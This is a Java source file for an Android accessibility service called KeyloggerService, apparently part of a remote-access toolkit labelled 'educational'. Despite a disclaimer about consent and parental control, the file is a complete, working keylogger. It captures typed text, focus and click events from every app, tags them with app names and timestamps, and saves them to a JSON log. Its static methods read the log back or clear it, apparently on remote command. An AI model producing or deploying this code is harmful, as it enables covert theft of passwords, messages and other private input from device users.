package com.remoteaccess.educational.commands;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * EDUCATIONAL KEYLOGGER SERVICE
 * 
 * ⚠️ DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY
 * - Requires user consent via Accessibility Service
 * - User must manually enable in Settings
 * - Visible in Android Settings > Accessibility
 * - Can be disabled anytime by user
 * - Logs stored locally on device
 * 
 * USE CASES:
 * - Personal device monitoring
 * - Parental control (with child's knowledge)
 * - Security research
 * - Learning Android Accessibility API
 */
public class KeyloggerService extends AccessibilityService {

    private static final String TAG = "KeyloggerService";
    private static final String LOG_FILE = "keylog.txt";
    
    private List<KeylogEntry> keylogBuffer = new ArrayList<>();
    private static boolean isEnabled = false;

    public static class KeylogEntry {
        public String timestamp;
        public String packageName;
        public String appName;
        public String text;
        public String eventType;

        public KeylogEntry(String timestamp, String packageName, String appName, String text, String eventType) {
            this.timestamp = timestamp;
            this.packageName = packageName;
            this.appName = appName;
            this.text = text;
            this.eventType = eventType;
        }

        public JSONObject toJSON() throws JSONException {
            JSONObject json = new JSONObject();
            json.put("timestamp", timestamp);
            json.put("packageName", packageName);
            json.put("appName", appName);
            json.put("text", text);
            json.put("eventType", eventType);
            return json;
        }
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | 
                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
                         AccessibilityEvent.TYPE_VIEW_CLICKED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        
        setServiceInfo(info);
        isEnabled = true;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isEnabled) return;

        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
            String eventType = getEventTypeString(event.getEventType());
            
            // Get text from event
            String text = "";
            if (event.getText() != null && !event.getText().isEmpty()) {
                text = event.getText().toString();
            }
            
            // Get text from source node
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && text.isEmpty()) {
                CharSequence nodeText = source.getText();
                if (nodeText != null) {
                    text = nodeText.toString();
                }
            }

            if (!text.isEmpty()) {
                KeylogEntry entry = new KeylogEntry(
                    timestamp,
                    packageName,
                    getAppName(packageName),
                    text,
                    eventType
                );
                
                keylogBuffer.add(entry);
                
                // Save to file periodically
                if (keylogBuffer.size() >= 10) {
                    saveToFile();
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onInterrupt() {
        isEnabled = false;
        saveToFile(); // Save remaining logs
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isEnabled = false;
        saveToFile();
    }

    /**
     * Save logs to file
     */
    private void saveToFile() {
        if (keylogBuffer.isEmpty()) return;

        try {
            File logFile = new File(getExternalFilesDir(null), LOG_FILE);
            FileWriter writer = new FileWriter(logFile, true); // Append mode
            
            for (KeylogEntry entry : keylogBuffer) {
                writer.write(entry.toJSON().toString() + "\n");
            }
            
            writer.close();
            keylogBuffer.clear();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Get keylogs as JSON
     */
    public static JSONObject getKeylogs(Context context, int limit) {
        JSONObject result = new JSONObject();
        
        try {
            File logFile = new File(context.getExternalFilesDir(null), LOG_FILE);
            
            if (!logFile.exists()) {
                result.put("success", false);
                result.put("error", "No logs found");
                return result;
            }

            // Read file
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(logFile));
            JSONArray logs = new JSONArray();
            String line;
            int count = 0;
            
            while ((line = reader.readLine()) != null && count < limit) {
                logs.put(new JSONObject(line));
                count++;
            }
            
            reader.close();

            result.put("success", true);
            result.put("logs", logs);
            result.put("count", logs.length());
            result.put("totalSize", logFile.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Clear all logs
     */
    public static JSONObject clearLogs(Context context) {
        JSONObject result = new JSONObject();
        
        try {
            File logFile = new File(context.getExternalFilesDir(null), LOG_FILE);
            
            if (logFile.exists()) {
                boolean deleted = logFile.delete();
                result.put("success", deleted);
                result.put("message", deleted ? "Logs cleared" : "Failed to clear logs");
            } else {
                result.put("success", false);
                result.put("error", "No logs to clear");
            }
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Check if service is enabled
     */
    public static boolean isServiceEnabled() {
        return isEnabled;
    }

    /**
     * Get event type as string
     */
    private String getEventTypeString(int eventType) {
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TEXT_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "VIEW_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "VIEW_CLICKED";
            default:
                return "UNKNOWN";
        }
    }

    /**
     * Get app name from package name
     */
    private String getAppName(String packageName) {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            return packageName;
        }
    }
}
